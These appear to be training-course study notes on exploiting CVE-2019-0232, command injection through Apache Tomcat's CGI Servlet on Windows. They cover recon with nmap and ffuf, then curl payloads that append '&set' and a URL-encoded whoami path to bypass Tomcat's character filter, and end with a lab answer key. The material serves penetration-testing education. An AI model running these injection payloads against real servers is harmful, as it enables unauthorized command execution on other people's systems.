# Section 19 — Attacking Tomcat CGI

## ID
1900

## Module
Attacking Common Applications

## Kind
notes

## Title
Section 19 — Attacking Tomcat CGI

## Description
Exploiting CVE-2019-0232 to achieve remote code execution on Windows-based Apache Tomcat servers via command injection through the CGI Servlet's `enableCmdLineArguments` feature.

## Tags
tomcat, cgi, cve-2019-0232, command-injection, windows, url-encoding

## Commands
- nmap -p- -sC -Pn <TARGET_IP> --open
- ffuf -w /usr/share/dirb/wordlists/common.txt -u http://<TARGET_IP>:8080/cgi/FUZZ.cmd
- ffuf -w /usr/share/dirb/wordlists/common.txt -u http://<TARGET_IP>:8080/cgi/FUZZ.bat
- curl 'http://<TARGET_IP>:8080/cgi/welcome.bat?&set'
- curl 'http://<TARGET_IP>:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe'

## What This Section Covers
CVE-2019-0232 is a command injection vulnerability in Apache Tomcat's CGI Servlet on Windows when `enableCmdLineArguments` is enabled. The servlet fails to validate user input before passing it to CGI scripts, allowing attackers to append arbitrary OS commands using the `&` batch separator. Affected versions: Tomcat 9.0.0.M1–9.0.17, 8.5.0–8.5.39, 7.0.0–7.0.93.

## Methodology
1. Scan the target with `nmap -p- -sC -Pn <IP> --open` to identify Tomcat and its version on port 8080.
2. Fuzz for CGI scripts under `/cgi/` using ffuf with both `.cmd` and `.bat` extensions: `ffuf -w /usr/share/dirb/wordlists/common.txt -u http://<IP>:8080/cgi/FUZZ.bat`.
3. Confirm the discovered script returns a response (e.g., `http://<IP>:8080/cgi/welcome.bat`).
4. Test command injection by appending `&dir` to the query string: `http://<IP>:8080/cgi/welcome.bat?&dir`.
5. If direct commands like `whoami` fail, use `&set` to dump environment variables and check if `PATH` is unset.
6. With no PATH, use the full binary path. URL-encode the payload to bypass Tomcat's special-character filter: `?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe` (decoded: `&c:\windows\system32\whoami.exe`).

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| After running the URL Encoded 'whoami' payload, what user is tomcat running as? | feldspar\omen | `curl 'http://<IP>:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe'` |

## Key Takeaways
- The CGI Servlet acts as middleware between the web server and external scripts (Perl, Python, Bash/Batch) — it's not Tomcat-specific logic, it's a bridge to OS-level execution.
- On Windows, `&` is the batch command separator — appending `&<cmd>` to a CGI query string chains your command after the legitimate script execution.
- Tomcat patched with a regex filter blocking special characters, but URL-encoding the payload (`%3A` for `:`, `%5C` for `\`) bypasses it.
- When `PATH` is unset (visible via `&set`), you must use absolute paths like `c:\windows\system32\whoami.exe`.
- Always fuzz for both `.cmd` and `.bat` extensions on Windows targets — one may exist while the other doesn't.

## Gotchas
- `whoami` and other commands without a full path will fail silently if `PATH` is unset — always check environment variables with `&set` first.
- Unencoded payloads with `\` or `:` get rejected by Tomcat's input filter — you must URL-encode them.
- `.cmd` fuzzing may return nothing while `.bat` fuzzing finds scripts — don't stop after one extension.
